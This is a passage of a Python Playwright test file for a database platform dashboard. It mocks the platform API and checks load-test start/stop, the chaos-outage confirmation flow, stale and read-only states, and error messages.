         "cdc": {"changefeeds": [], "signals_per_min": 0.0, "nudges_per_min": 0.0},
         "integrity": {"checked_at": "2026-10-28T12:00:00+00:00", "accounts": 312, "drift": 0, "skipped": None,
                       "ok": True, "follower_reads": True},
         "as_of": _NOW, "stale": False}


class _PlatformApi:
    """page.route handlers for /api/v1/platform/*, recording the writes."""

    def __init__(self, live=None, cluster=None, data=None):
        self.live, self.cluster, self.data = live or _live(), cluster or _CLUSTER_SQL, data or _DATA
        self.posts, self.replies = [], {}

    def __call__(self, route):
        path = urllib.parse.urlparse(route.request.url).path.removeprefix("/api/v1/platform")
        if route.request.method == "POST":
            body = json.loads(route.request.post_data or "{}")
            self.posts.append((path, body))
            queue = self.replies.get(path)
            status, reply = queue.pop(0) if queue else (200, {"state": "running"})
            return route.fulfill(status=status, json=reply)
        return route.fulfill(json={"/live": self.live, "/cluster": self.cluster, "/data": self.data}[path])


def _platform(browser, api, theme="light"):
    ctx, page, errors = _page(browser, theme)
    page.route("**/api/v1/platform/**", api)
    return ctx, page, errors


def test_the_platform_page_shows_a_running_load(server, browser):
    api = _PlatformApi(live=_live("running"), cluster=_CLUSTER_CHAOS)
    ctx, page, errors = _platform(browser, api, "dark")
    try:
        _login(page, server, "maya")
        page.goto(server + "/platform")
        expect(page.get_by_test_id("ops-rate")).to_have_text("48.2")
        expect(page.get_by_test_id("p95")).to_have_text("140 ms")
        expect(page.locator("[data-region-row]")).to_have_count(2)
        expect(page.get_by_text("Load started: balanced, 100 customers, 50 ops/s, 16 workers")).to_be_visible()
        assert page.locator("canvas[data-chart=throughput]").count() == 1
        assert page.locator("canvas[data-chart=latency]").count() == 1
        OUT.mkdir(parents=True, exist_ok=True)
        page.wait_for_timeout(2500)  # several polls, each answering the same event again
        expect(page.locator(".b-event")).to_have_count(1)
        expect(page.get_by_text("Errors: 3 transaction conflicts (40001)")).to_be_visible()
        page.screenshot(path=str(OUT / "platform-running-dark.png"), full_page=True)
        assert not errors, errors
    finally:
        ctx.close()


def test_start_sends_the_form_and_stop_stops(server, browser):
    api = _PlatformApi()
    ctx, page, errors = _platform(browser, api)
    try:
        _login(page, server, "maya")
        page.goto(server + "/platform")
        page.get_by_label("Profile").select_option("payments")
        page.get_by_label("Customers").fill("200")
        page.get_by_label("Operations per second").fill("120")
        page.get_by_label("Workers").fill("24")
        page.get_by_label("Run for").select_option("300")
        page.get_by_role("button", name="Start load").click()
        page.wait_for_timeout(300)
        start = [b for p, b in api.posts if p == "/load"][0]
        assert start == {"action": "start", "profile": "payments", "users": 200, "rate": 120, "workers": 24,
                         "duration_s": 300, "ramp_s": 10}
        api.live = _live("running")
        page.get_by_role("button", name="Stop").click()
        page.wait_for_timeout(300)
        assert [b for p, b in api.posts if p == "/load"][-1] == {"action": "stop"}
        assert not errors, errors
    finally:
        ctx.close()


def test_the_chaos_card_shows_only_with_a_plane(server, browser):
    api = _PlatformApi()
    ctx, page, errors = _platform(browser, api)
    try:
        _login(page, server, "maya")
        page.goto(server + "/platform")
        page.wait_for_timeout(500)
        expect(page.get_by_test_id("chaos-card")).to_be_hidden()
        api.live = _live(controls={**_CONTROLS, "chaos": True})
        api.cluster = _CLUSTER_CHAOS
        page.reload()
        expect(page.get_by_test_id("chaos-card")).to_be_visible()
        expect(page.get_by_role("button", name="Take us-east-1 down")).to_be_visible()
        assert not errors, errors
    finally:
        ctx.close()


def test_an_outage_asks_twice_when_the_plane_warns(server, browser):
    api = _PlatformApi(live=_live(controls={**_CONTROLS, "chaos": True}), cluster=_CLUSTER_CHAOS)
    api.replies["/chaos"] = [(409, {"error": "3 ranges lose quorum", "code": "needs_confirm", "needs_confirm": True,
                                    "warning": "3 ranges lose quorum"}),
                             (200, {"ok": True, "targets": ["us-east-1a-n1"]})]
    ctx, page, errors = _platform(browser, api)
    dialogs = []

    def accept(dialog):
        dialogs.append(dialog.message)
        dialog.accept()

    page.on("dialog", accept)
    try:
        _login(page, server, "maya")
        page.goto(server + "/platform")
        page.get_by_role("button", name="Take us-east-1 down").click()
        page.wait_for_timeout(500)
        chaos = [b for p, b in api.posts if p == "/chaos"]
        assert [b.get("confirm") for b in chaos] == [False, True]
        assert chaos[0]["action"] == "outage" and chaos[0]["kind"] == "region" and chaos[0]["value"] == "us-east-1"
        assert len(dialogs) == 2 and "us-east-1" in dialogs[0] and "3 ranges lose quorum" in dialogs[1]
        # The 409 that asks for confirmation is the protocol, and Chromium logs every 4xx.
        assert not [e for e in errors if "status of 409" not in e], errors
    finally:
        ctx.close()


def test_stale_sections_dim_and_read_only_disables_the_controls(server, browser):
    api = _PlatformApi(live=_live(controls={**_CONTROLS, "load": False}), cluster={**_CLUSTER_SQL, "stale": True})
    ctx, page, errors = _platform(browser, api)
    try:
        _login(page, server, "maya")
        page.goto(server + "/platform")
        expect(page.get_by_test_id("topology-card")).to_have_class(re.compile(r"\bstale\b"))
        expect(page.get_by_role("button", name="Start load")).to_be_disabled()
        expect(page.get_by_text("Read-only here")).to_be_visible()
        assert not errors, errors
    finally:
        ctx.close()


def test_a_refused_start_says_why_in_plain_words(server, browser):
    api = _PlatformApi()
    api.replies["/load"] = [(400, {"error": "The rate must be between 0.1 and 2000", "code": "bad_request"})]
    ctx, page, errors = _platform(browser, api)
    try:
        _login(page, server, "maya")
        page.goto(server + "/platform")
        page.get_by_role("button", name="Start load").click()
        expect(page.get_by_text("The rate must be between 0.1 and 2000")).to_be_visible()
    finally:
        ctx.close()
